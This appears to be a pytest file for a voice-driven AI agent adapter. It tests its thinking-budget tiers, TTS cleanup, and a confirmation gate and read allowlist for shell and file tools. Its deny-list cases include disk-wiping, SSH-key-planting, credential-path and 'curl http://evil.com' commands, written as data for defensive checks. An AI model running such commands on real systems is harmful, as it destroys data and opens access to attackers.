#!/usr/bin/env python3
"""Unit tests for `/workspace/tools/gotchi_zero_adapter.py`."""

import asyncio
import base64
from pathlib import Path
import sys
import time
from typing import Any, Dict, List

_REPO_ROOT = str(Path(__file__).resolve().parent.parent)
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)
if f"{_REPO_ROOT}/gotchi" not in sys.path:
    sys.path.insert(1, f"{_REPO_ROOT}/gotchi")
if "/workspace" not in sys.path:
    sys.path.append("/workspace")
if "/workspace/gotchi" not in sys.path:
    sys.path.append("/workspace/gotchi")

from fastapi.testclient import TestClient

from tools.gotchi_zero_adapter import (
    DEFAULT_GOTCHI_MODEL,
    GOTCHI_THINKING_TELEMETRY,
    GotchiZeroBrainAdapter,
    build_gotchi_zero_system_prompt,
    build_thinking_config,
    clean_spoken_text_for_tts,
    create_zero_gotchi_app,
    execute_gotchi_tool_call,
    extract_and_forward_artifacts_to_zero_chat,
    is_allowed_voice_read_path,
    is_destructive_voice_command,
    is_destructive_voice_write,
    prefetch_zero_memory,
    select_thinking_budget,
    select_thinking_level,
    send_gotchi_artifact_to_zero_chat,
)
from poc.gotchi_poc import wrap_pcm16_to_wav


def test_clean_spoken_text_for_tts():
    raw = (
        "### Status Update\n"
        "- **Printer:** Ready at [OctoPrint](<https://198.51.100.10:8888>)!\n"
        "- Check `build_case.py` or <https://example.com/test>."
    )
    cleaned = clean_spoken_text_for_tts(raw)
    assert "###" not in cleaned
    assert "**" not in cleaned
    assert "`" not in cleaned
    assert "https://" not in cleaned
    assert "OctoPrint" in cleaned
    assert "build_case.py" in cleaned


def test_select_thinking_budget_and_fast_memory_prefetch():
    assert DEFAULT_GOTCHI_MODEL == "gemini-3.8-flash"
    # Tier 1: Step 0 and Step 1 default to LOW / 0
    assert select_thinking_level("How warm is the garage?", step=0) == "LOW"
    assert select_thinking_level("Summarize the memory lookup", step=1) == "LOW"
    assert select_thinking_budget("How warm is the garage?", step=0) == 0
    assert select_thinking_budget("Summarize the memory lookup", step=1) == 0

    # Tier 2: Escalates to MEDIUM / 512 on tool error, Step 2+, or 5-frame camera burst
    assert select_thinking_level("Retry after error", step=1, tool_had_error=True) == "MEDIUM"
    assert select_thinking_level("Chained multi-tool step", step=2) == "MEDIUM"
    assert select_thinking_level("Burst analysis", step=0, burst_count=5) == "MEDIUM"
    assert select_thinking_budget("Retry after error", step=1, tool_had_error=True) == 512
    assert select_thinking_budget("Chained multi-tool step", step=2) == 512
    assert select_thinking_budget("Burst analysis", step=0, burst_count=5) == 512

    # Tier 3: Escalates to HIGH / 1024 when model invokes request_deep_thinking
    prev_high = GOTCHI_THINKING_TELEMETRY["HIGH"]
    assert (
        select_thinking_level(
            "Deep battery tradeoff",
            step=1,
            model_requested_deep_thinking=True,
        )
        == "HIGH"
    )
    assert GOTCHI_THINKING_TELEMETRY["HIGH"] == prev_high + 1
    assert (
        select_thinking_budget(
            "Deep battery tradeoff",
            step=1,
            model_requested_deep_thinking=True,
        )
        == 1024
    )

    cfg_38_low = build_thinking_config("gemini-3.8-flash", "Quick status check", step=1)
    assert str(cfg_38_low.thinking_level).endswith("LOW")
    cfg_38_med = build_thinking_config("gemini-3.8-flash", "Step 2 chain", step=2)
    assert str(cfg_38_med.thinking_level).endswith("MEDIUM")
    cfg_38_high = build_thinking_config(
        "gemini-3.8-flash",
        "Deep math",
        step=1,
        model_requested_deep_thinking=True,
    )
    assert str(cfg_38_high.thinking_level).endswith("HIGH")

    # Warm up connection on first call, then verify sub-50ms warm recall
    _ = prefetch_zero_memory("gotchi hardware companion")
    t0 = time.monotonic()
    _ = prefetch_zero_memory("gotchi hardware companion")
    elapsed_ms = (time.monotonic() - t0) * 1000.0
    assert elapsed_ms < 50.0


def test_build_gotchi_zero_system_prompt_shares_zero_voice_context():
    prompt = build_gotchi_zero_system_prompt("What is on my task list?", has_vision=True)
    assert "GOTCHI & ZERO-VOICE UNIFIED PERSONA INVARIANTS" in prompt
    assert "Schedar" in prompt
    assert "live camera snapshot or 5-frame burst" in prompt
    assert "post_note_to_zero_chat" in prompt
    assert "request_deep_thinking(spoken_preamble, reason)" in prompt
    assert "PRE-TOOL SPOKEN PREAMBLE" in prompt


def test_voice_security_gate_and_realpath_read_allowlist(monkeypatch, tmp_path):
    staged_msgs: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: staged_msgs.append((int(ch), content)),
    )

    # 1. Non-destructive shell commands execute directly without confirmation
    shell_res = asyncio.run(
        execute_gotchi_tool_call("run_shell_command", {"command": "git status -s"})
    )
    assert shell_res.get("confirmation_required") is not True
    assert "exit_code" in shell_res

    find_res = asyncio.run(
        execute_gotchi_tool_call(
            "run_shell_command",
            {"command": "find /workspace/tools -maxdepth 1 -name gotchi_zero_adapter.py"},
        )
    )
    assert find_res.get("confirmation_required") is not True
    assert "exit_code" in find_res
    assert "gotchi_zero_adapter.py" in find_res.get("output", "")

    # 2. Destructive shell commands trigger stage_voice_mutation_confirmation
    destructive_cmds = [
        "rm -rf /workspace/tmp_test",
        "git reset --hard HEAD~1",
        "docker compose down",
    ]
    for d_cmd in destructive_cmds:
        d_res = asyncio.run(
            execute_gotchi_tool_call("run_shell_command", {"command": d_cmd})
        )
        assert d_res["confirmation_required"] is True
        assert d_res["status"] == "staged_in_zero_chat"
        assert any(
            ch == 1542081375287640084 and d_cmd in body for ch, body in staged_msgs
        )

    # 3. Writing a new file inside an allowed root succeeds directly
    ws_allowed = tmp_path / "workspace"
    ws_allowed.mkdir(exist_ok=True)
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._ALLOWED_VOICE_READ_PREFIXES",
        ("/workspace/", "/baseball/", str(ws_allowed)),
    )

    new_allowed_file = ws_allowed / "notes.txt"
    write_res = asyncio.run(
        execute_gotchi_tool_call(
            "write_local_file",
            {"file_path": str(new_allowed_file), "content": "fresh voice note"},
        )
    )
    assert write_res.get("confirmation_required") is not True
    assert "Successfully wrote" in write_res.get("status", "")
    assert new_allowed_file.read_text() == "fresh voice note"

    # 4. Overwriting an existing file triggers confirmation and does not mutate disk
    overwrite_res = asyncio.run(
        execute_gotchi_tool_call(
            "write_local_file",
            {"file_path": str(new_allowed_file), "content": "overwriting note"},
        )
    )
    assert overwrite_res["confirmation_required"] is True
    assert overwrite_res["status"] == "staged_in_zero_chat"
    assert new_allowed_file.read_text() == "fresh voice note"
    assert any(
        ch == 1542081375287640084 and "overwriting note" in body
        for ch, body in staged_msgs
    )

    # 5. Writing outside allowed roots triggers confirmation
    outside_file = tmp_path / "outside_allowed.txt"
    outside_res = asyncio.run(
        execute_gotchi_tool_call(
            "write_local_file",
            {"file_path": str(outside_file), "content": "outside text"},
        )
    )
    assert outside_res["confirmation_required"] is True
    assert outside_res["status"] == "staged_in_zero_chat"
    assert not outside_file.exists()

    # 6. read_local_file allowlist resolves os.path.realpath BEFORE checking prefixes and blocks .env / .ssh / traversal
    ok_readme, resolved_readme = is_allowed_voice_read_path("/workspace/gotchi/README.md")
    assert ok_readme is True
    assert resolved_readme.endswith("/gotchi/README.md")

    # Rejects traversal outside /workspace/ or /baseball/
    ok_trav, _ = is_allowed_voice_read_path("/workspace/../etc/passwd")
    assert ok_trav is False

    # Rejects .env and .ssh by basename and path segment
    ok_env, _ = is_allowed_voice_read_path("/workspace/.env")
    assert ok_env is False
    ok_env_prod, _ = is_allowed_voice_read_path("/workspace/gotchi/.env.production")
    assert ok_env_prod is False
    ok_ssh, _ = is_allowed_voice_read_path("/workspace/.ssh/id_ed25519")
    assert ok_ssh is False

    # Rejects symlink inside allowed root pointing to .env or outside root
    secret_env = ws_allowed / ".env"
    secret_env.write_text("SECRET=123")
    symlink_to_env = ws_allowed / "innocent_notes.txt"
    symlink_to_env.symlink_to(secret_env)
    ok_sym, reason_sym = is_allowed_voice_read_path(
        str(symlink_to_env),
        allowed_prefixes=(str(ws_allowed),),
    )
    assert ok_sym is False
    assert ".env" in reason_sym

    outside_secret = tmp_path / "outside_secret.txt"
    outside_secret.write_text("OUTSIDE=1")
    symlink_outside = ws_allowed / "escape.txt"
    symlink_outside.symlink_to(outside_secret)
    ok_escape, reason_escape = is_allowed_voice_read_path(
        str(symlink_outside),
        allowed_prefixes=(str(ws_allowed),),
    )
    assert ok_escape is False
    assert "outside allowed voice read roots" in reason_escape


def test_is_destructive_voice_command_and_write(tmp_path):
    # Non-destructive commands return (False, "")
    for safe_cmd in [
        "git status -s",
        "git log -n 5",
        "git diff HEAD~1",
        "find /workspace/tools -maxdepth 1 -name gotchi_zero_adapter.py",
        "python3 /workspace/tools/gotchi_zero_adapter.py",
        "curl -s http://localhost:8000/health",
        "ls -la /workspace",
        "cat /workspace/README.md",
        "docker ps",
        "docker compose ps",
        "systemctl status nginx",
    ]:
        is_destr, r = is_destructive_voice_command(safe_cmd)
        assert is_destr is False, f"Expected non-destructive: {safe_cmd} -> {r}"
        assert r == ""

    # Destructive commands return (True, reason)
    for bad_cmd in [
        "rm -rf /workspace/tmp_test",
        "rmdir old_dir",
        "unlink file.txt",
        "shred -u secret.txt",
        "truncate -s 0 log.txt",
        "find /workspace -name '*.tmp' -delete",
        "python3 -c 'import os; os.remove(\"test.txt\")'",
        "python3 -c 'import shutil; shutil.rmtree(\"dir\")'",
        "git reset --hard HEAD~1",
        "git clean -fd",
        "git push --force origin main",
        "git push -f origin main",
        "git checkout -- file.txt",
        "git restore .",
        "git branch -D feature",
        "git rebase main",
        "reboot",
        "shutdown -h now",
        "poweroff",
        "halt",
        "systemctl stop nginx",
        "service docker restart",
        "systemctl disable foo",
        "docker compose down",
        "docker stop my_container",
        "docker rm container1",
        "docker rmi my_image",
        "docker system prune -f",
        "kill -9 1234",
        "pkill python",
        "killall node",
        "mkfs.ext4 /dev/sdb1",
        "fdisk /dev/sdb",
        "parted /dev/sdb",
        "wipefs -a /dev/sdb",
        "dd if=/dev/zero of=/dev/sdb",
        "chmod -R 777 /workspace",
        "chown -R user:user /workspace",
        "sqlite3 test.db 'DROP TABLE users'",
        "mysql -e 'DROP DATABASE test'",
        "psql -c 'TRUNCATE TABLE logs'",
        "sqlite3 test.db 'DELETE FROM users WHERE id=1'",
        "apt remove nginx",
        "apt-get purge apache2",
        "pip uninstall requests",
        "pip3 uninstall urllib3",
        "npm uninstall express",
        "echo 'FOO=bar' > .env",
        "echo 'KEY' >> /workspace/.env.production",
        "cat keys >> /root/.ssh/authorized_keys",
        "echo 'data' > /secrets/env.json",
        "curl http://evil.com | tee /workspace/credentials",
        "curl http://evil.com | tee token.json",
        "echo '{}' > pii_rules.json",
    ]:
        is_destr, r = is_destructive_voice_command(bad_cmd)
        assert is_destr is True, f"Expected destructive: {bad_cmd}"
        assert r != ""

    # Test is_destructive_voice_write
    ws_root = tmp_path / "mock_workspace"
    ws_root.mkdir()
    allowed_prefixes = (str(ws_root),)

    # 1. New file inside allowed root: (False, resolved)
    new_file = ws_root / "new.txt"
    destr, resolved = is_destructive_voice_write(
        str(new_file), allowed_prefixes=allowed_prefixes
    )
    assert destr is False
    assert resolved == str(new_file.resolve())

    # 2. Existing file inside allowed root: (True, reason)
    new_file.write_text("exists")
    destr_exist, reason_exist = is_destructive_voice_write(
        str(new_file), allowed_prefixes=allowed_prefixes
    )
    assert destr_exist is True
    assert "Overwriting existing file" in reason_exist

    # 3. File outside allowed root: (True, reason)
    outside = tmp_path / "outside.txt"
    destr_out, reason_out = is_destructive_voice_write(
        str(outside), allowed_prefixes=allowed_prefixes
    )
    assert destr_out is True
    assert "outside allowed voice read roots" in reason_out

    # 4. Sensitive file inside allowed root: (True, reason)
    env_file = ws_root / ".env"
    destr_env, reason_env = is_destructive_voice_write(
        str(env_file), allowed_prefixes=allowed_prefixes
    )
    assert destr_env is True
    assert "sensitive" in reason_env


def test_explicitly_posted_to_zero_chat_scoping(monkeypatch):
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    class FakeChunk:
        def __init__(self, text: str = "", function_calls: Any = None):
            self.text = text
            self.function_calls = function_calls
            self.candidates = []

    class FakeFunctionCall:
        def __init__(self, name: str, args: Dict[str, Any]):
            self.name = name
            self.args = args

    class FakeModels:
        def __init__(self, fcalls: List[Any]):
            self.fcalls = fcalls
            self.step = 0

        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            if self.step == 0:
                self.step += 1
                yield FakeChunk(function_calls=self.fcalls)
            else:
                yield FakeChunk(text="Command finished.")

    class FakeAio:
        def __init__(self, fcalls: List[Any]):
            self.models = FakeModels(fcalls)

    class FakeGenaiClient:
        def __init__(self, fcalls: List[Any]):
            self.aio = FakeAio(fcalls)

    async def run_scenario(fcalls: List[Any]) -> bool:
        adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
        adapter._genai_client = FakeGenaiClient(fcalls)
        _, posted, _ = await adapter._run_gemini_with_tools(
            prompt="test",
            image_bytes=None,
            burst_images=[],
        )
        return posted

    # Non-destructive shell does not set explicitly_posted_to_zero_chat
    p_safe = asyncio.run(
        run_scenario([FakeFunctionCall("run_shell_command", {"command": "git status -s"})])
    )
    assert p_safe is False

    # Destructive shell sets explicitly_posted_to_zero_chat
    p_destr = asyncio.run(
        run_scenario([FakeFunctionCall("run_shell_command", {"command": "rm -rf /workspace/tmp"})])
    )
    assert p_destr is True

    # post_note_to_zero_chat sets explicitly_posted_to_zero_chat
    p_note = asyncio.run(
        run_scenario([FakeFunctionCall("post_note_to_zero_chat", {"message": "link note"})])
    )
    assert p_note is True


def test_streaming_gemini_sentence_splitter_and_deep_thinking_escalation(monkeypatch):
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    recorded_configs: List[Any] = []

    class FakeChunk:
        def __init__(self, text: str = "", function_calls: Any = None):
            self.text = text
            self.function_calls = function_calls
            self.candidates = []

    class FakeFunctionCall:
        def __init__(self, name: str, args: Dict[str, Any]):
            self.name = name
            self.args = args

    class FakeModels:
        def __init__(self):
            self.call_idx = 0

        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            recorded_configs.append(config.thinking_config)
            idx = self.call_idx
            self.call_idx += 1
            if idx == 0:
                # Step 0 (LOW): calls request_deep_thinking with a spoken preamble
                yield FakeChunk(
                    function_calls=[
                        FakeFunctionCall(
                            "request_deep_thinking",
                            {
                                "spoken_preamble": "Let me run the numbers on that.",
                                "reason": "battery life calculation",
                            },
                        )
                    ]
                )
            else:
                # Step 1 (escalated to HIGH): streams token deltas across sentence boundaries
                yield FakeChunk(text="Dr. Smith confirmed ")
                yield FakeChunk(text="the rail holds 4.1 volts. ")
                yield FakeChunk(text="Current draw is 18 milliamps.")

    class FakeAio:
        def __init__(self):
            self.models = FakeModels()

    class FakeGenaiClient:
        def __init__(self):
            self.aio = FakeAio()

    adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    adapter._genai_client = FakeGenaiClient()

    streamed_live: List[str] = []
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-stream-1",
                "prompt": "Calculate battery life under load.",
                "_on_sentence": streamed_live.append,
            }
        )
    )
    # Step 0 ran at LOW, Step 1 escalated to HIGH via request_deep_thinking
    assert str(recorded_configs[0].thinking_level).endswith("LOW")
    assert str(recorded_configs[1].thinking_level).endswith("HIGH")
    # Spoken preamble + streamed sentences arrived in order without splitting on 'Dr.' or '4.1'
    assert streamed_live == [
        "Let me run the numbers on that.",
        "Dr. Smith confirmed the rail holds 4.1 volts.",
        "Current draw is 18 milliamps.",
    ]
    assert "Dr. Smith confirmed the rail holds 4.1 volts." in res["reply"]


def test_extract_and_forward_artifacts_to_zero_chat(monkeypatch, tmp_path):
    enqueued: List[Any] = []
    delivered_files: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: enqueued.append((int(ch), content)),
    )
    monkeypatch.setattr(
        "tools.deliver_image.deliver_file",
        lambda path, channel_input=None, caption=None, **kw: (
            delivered_files.append((str(path), int(channel_input), caption)) or {"success": True}
        ),
    )

    # 1. Hyperlink in raw_reply -> auto-forwarded to #zero-chat (1542081375287640084) + spoken cue added
    raw = "Found the switch at [DigiKey](<https://example.com/switch>)."
    spoken = clean_spoken_text_for_tts(raw)
    updated_spoken, sent = extract_and_forward_artifacts_to_zero_chat(
        raw_reply=raw,
        spoken_reply=spoken,
        explicitly_posted_in_turn=False,
        dispatch_discord=True,
    )
    assert sent is True
    assert "Zero-Chat" in updated_spoken
    assert any(ch == 1542081375287640084 and "https://example.com/switch" in body for ch, body in enqueued)

    # 2. Explicit file attachment via send_gotchi_artifact_to_zero_chat
    dummy_stl = tmp_path / "case.stl"
    dummy_stl.write_bytes(b"solid gotchi_case\nendsolid gotchi_case\n")
    res = send_gotchi_artifact_to_zero_chat(
        message="Here is the STL render and [Printables Link](<https://example.com/model>).",
        file_path=str(dummy_stl),
        mirror_gotchi_chat=True,
    )
    assert res["ok"] is True
    assert res["file_delivered"] is True
    assert any(cid == 1542081375287640084 for _, cid, _ in delivered_files)


def test_gotchi_zero_adapter_end_to_end_and_channel_logging(monkeypatch, tmp_path):
    enqueued: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: enqueued.append((int(ch), content)),
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda speaker, text, **kw: enqueued.append(("history", speaker, text, kw.get("source_tag"))),
    )
    monkeypatch.setattr(
        "tools.deliver_image.deliver_image",
        lambda path, channel_input=None, caption=None: enqueued.append(("image", channel_input, caption)),
    )

    def fake_llm(turn: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "reply": "**Garage sensor** is at **68°F**. Details at [Home Assistant](<https://example.com>).",
        }

    adapter = GotchiZeroBrainAdapter(llm_caller=fake_llm, dispatch_discord=True)
    app = create_zero_gotchi_app(adapter=adapter)
    client = TestClient(app)

    wav = wrap_pcm16_to_wav(b"\x18\x00" * 8000)
    resp = client.post(
        "/api/voice/interact",
        data={
            "node_id": "gotchi-ryan-01",
            "session_id": "sess-test-42",
            "prompt": "How warm is the garage?",
        },
        files={"audio": ("ptt.wav", wav, "audio/wav")},
    )
    assert resp.status_code == 200
    assert "Garage sensor is at 68" in resp.text
    assert "Zero-Chat" in resp.text
    # Logged to #gotchi-chat (1562246590943461429) AND hyperlink forwarded to #zero-chat (1542081375287640084)
    assert any(item[0] == 1562246590943461429 for item in enqueued if len(item) == 2)
    assert any(item[0] == 1542081375287640084 for item in enqueued if len(item) == 2)

    # Also test direct /api/gotchi/brain subscription_url endpoint with burst images
    b64_img = base64.b64encode(b"\xff\xd8\xff\xe0fakejpeg").decode("ascii")
    brain_resp = client.post(
        "/api/gotchi/brain",
        json={
            "node_id": "gotchi-ryan-01",
            "session_id": "sess-burst-99",
            "prompt": "What part is this?",
            "burst_images_b64": [b64_img, b64_img],
        },
    )
    assert brain_resp.status_code == 200
    data = brain_resp.json()
    assert data["transcript"] == "What part is this?"
    assert "https://" not in data["reply"]
    assert data["sent_to_zero_chat"] is True
    assert any("Zero-Chat" in s for s in data["sentences"])


def test_adapter_ha_fastpath_short_circuits_llm():
    llm_called = False

    def fake_llm(_turn):
        nonlocal llm_called
        llm_called = True
        return {"reply": "LLM fallback reply"}

    def fake_ha_poster(url, headers, payload, timeout_s):
        return {
            "response": {
                "response_type": "action_done",
                "speech": {"plain": {"speech": "Turned on the workbench lamp."}},
                "data": {},
            },
            "conversation_id": "ha-conv-1",
        }

    streamed = []
    adapter = GotchiZeroBrainAdapter(
        llm_caller=fake_llm,
        dispatch_discord=False,
        ha_conversation_enabled=True,
        ha_base_url="http://198.51.100.10:8123",
        ha_access_token="test-token",
        ha_http_poster=fake_ha_poster,
    )
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-ha-fast",
                "prompt": "Turn on the workbench lamp",
                "_on_sentence": lambda s: streamed.append(s),
            }
        )
    )
    assert res["ha_fastpath"] is True
    assert res["reply"] == "Turned on the workbench lamp."
    assert streamed == ["Turned on the workbench lamp."]
    assert llm_called is False


def test_adapter_ha_fastpath_falls_back_to_llm_on_no_intent():
    llm_called = False

    def fake_llm(_turn):
        nonlocal llm_called
        llm_called = True
        return {"reply": "Zero LLM handled your general question."}

    def fake_ha_poster(url, headers, payload, timeout_s):
        return {
            "response": {
                "response_type": "error",
                "speech": {"plain": {"speech": "Sorry, I couldn't understand that"}},
                "data": {"code": "no_intent_matched"},
            }
        }

    adapter = GotchiZeroBrainAdapter(
        llm_caller=fake_llm,
        dispatch_discord=False,
        ha_conversation_enabled=True,
        ha_base_url="http://198.51.100.10:8123",
        ha_access_token="test-token",
        ha_http_poster=fake_ha_poster,
    )
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-ha-fallback",
                "prompt": "What is the pinout for the MAX98357A?",
            }
        )
    )
    assert res["ha_fastpath"] is False
    assert llm_called is True
    assert "Zero LLM handled" in res["reply"]
